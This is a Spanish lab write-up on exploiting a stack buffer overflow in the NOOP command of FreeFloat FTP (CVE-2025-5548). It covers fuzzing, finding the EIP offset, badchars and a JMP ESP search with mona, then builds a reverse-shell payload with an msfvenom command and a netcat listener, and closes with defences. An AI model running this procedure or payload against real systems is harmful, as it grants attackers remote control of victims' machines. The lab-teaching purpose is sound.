# 🚀 02 - Análisis y Explotación del CVE-2025-5548

## 🎯 Objetivo de la Fase
En esta segunda parte del laboratorio, el objetivo es materializar el riesgo del **CVE-2025-5548**. Se trata de una vulnerabilidad de **Stack Buffer Overflow** descubierta en el servidor *FreeFloat FTP* (un servicio legado de Windows). 

Tras analizar el binario con las herramientas preparadas en la fase anterior, descubrimos que el fallo reside en el manejador del comando `NOOP`. El servidor no valida el tamaño de la entrada antes de copiarla en la pila de memoria (Stack). Nuestro objetivo es explotar este fallo para conseguir una **Ejecución Remota de Código (RCE)**.

---

## 🔬 Metodología de Explotación: Las 6 Fases

Para desarrollar este exploit de forma controlada, he seguido el estándar de la industria, documentando cada paso del proceso:

### Fase 1: Pruebas de Estabilidad (Fuzzing)
El primer paso es comunicarnos con el puerto 21 del servidor FTP. Tras autenticarnos (o entrar como *anonymous*), enviamos el comando `NOOP` acompañado de cantidades crecientes de datos (ej. letras "A" `\x41`) hasta que el programa no puede manejar la memoria y colapsa.

* **Resultado:** Descubrimos que la aplicación crashea y el registro EIP se sobrescribe con `41414141` (AAAA). Esto confirma la vulnerabilidad.

> **📸 CAPTURA RECOMENDADA 1:** *Pon aquí una foto de Immunity Debugger donde se vea el programa pausado y el registro EIP lleno de 41414141.*

---

### Fase 2: Cálculo del Offset (Control del EIP)
Saber que el programa se rompe no es suficiente. Necesitamos saber **exactamente en qué byte** se sobrescribe el registro EIP para poder controlarlo.

1.  Generamos un patrón cíclico único con Metasploit (`pattern_create`).
2.  Lo enviamos a través del comando `NOOP`.
3.  Usamos **Mona.py** dentro de Immunity Debugger para localizar el patrón: `!mona findmsp`

* **Resultado:** Mona nos indica el *Offset* exacto. Es decir, el número de bytes de "basura" que debemos enviar justo antes de tocar el EIP.

> **📸 CAPTURA RECOMENDADA 2:** *Foto de la consola de Mona mostrando el mensaje "EIP contains normal pattern at offset XXXX".*

---

### Fase 3: Sobrescribir el EIP (Verificación)
Para confirmar que tenemos el control absoluto, modificamos nuestro script en Python (`exploit.py`).
Enviamos nuestra "basura" exacta (el Offset), seguida de cuatro letras "B" (`\x42`), y rellenamos el resto con "C"s.

Si lo hemos calculado bien, el EIP debería valer exactamente `42424242`.

> **📸 CAPTURA RECOMENDADA 3:** *Captura de los registros (Registers) en Immunity donde se vea claramente `EIP = 42424242`.*

---

### Fase 4: Identificación de Badchars (Caracteres Malos)
Antes de inyectar código malicioso (*Shellcode*), debemos identificar qué caracteres rompen la aplicación. Enviamos una matriz con todos los caracteres hexadecimales (del `\x01` al `\xff`).

* **Resultado del Análisis:** Al comparar la memoria con Mona, identificamos que los caracteres problemáticos para este comando FTP son el byte nulo y los saltos de línea: `\x00\x0a\x0d`. Deberemos evitar que nuestro *payload* contenga estos bytes.

---

### Fase 5: Búsqueda del "JMP ESP" (El Trampolín)
Como la dirección de la pila (ESP) cambia constantemente, necesitamos encontrar una instrucción dentro del programa que diga "Salta a la pila" (`JMP ESP`). 

Usamos Mona para buscar esta instrucción en un módulo del programa que no tenga protecciones modernas (como ASLR o DEP) y filtramos los *badchars* descubiertos:

!mona jmp -r esp -cpb "\x00\x0a\x0d"

Resultado: Encontramos una dirección de retorno válida. Al poner esta dirección en el EIP (escrita al revés por la arquitectura Little Endian), el programa saltará a nuestro código inyectado.

### Fase 6: Generación de la Carga (Payload) y Ejecución
Llegamos a la fase final. Utilizamos Msfvenom para generar un Shellcode que nos proporcione una conexión inversa (Reverse Shell), asegurándonos de excluir los caracteres malos:

msfvenom -p windows/shell_reverse_tcp LHOST=[TU_IP_KALI] LPORT=4444 -b "\x00\x0a\x0d" -f c
Integramos este código en nuestro script de Python, añadimos un "colchón" de instrucciones NOP (\x90 * 16) para dar margen a la memoria, y ponemos nuestro Netcat a la escucha (nc -nlvp 4444). Lanzamos el exploit final.

📸 CAPTURA RECOMENDADA 4: La terminal de Kali Linux mostrando tu Netcat recibiendo la conexión, con el prompt C:\Windows\System32> confirmando el acceso total al sistema.

### 🛡️ Conclusiones y Defensa
Explotar el CVE-2025-5548 en un laboratorio nos enseña por qué las vulnerabilidades de corrupción de memoria son tan críticas.

Para que un equipo de Blue Team pueda defenderse de ataques similares, se recomiendan las siguientes medidas:

Compilación Segura: El software debe compilarse activando protecciones modernas del sistema operativo como ASLR (que aleatoriza las direcciones de memoria), DEP (que impide ejecutar código en la pila) y SafeSEH.

Validación de Entradas: Sustituir funciones inseguras en C/C++ (como strcpy) por alternativas que limiten el tamaño del búfer (como strncpy).

Gestión del Software Legado: Priorizar el parcheo, aislamiento en red o sustitución directa de servicios antiguos (como FreeFloat FTP) que ya no reciben soporte de seguridad.
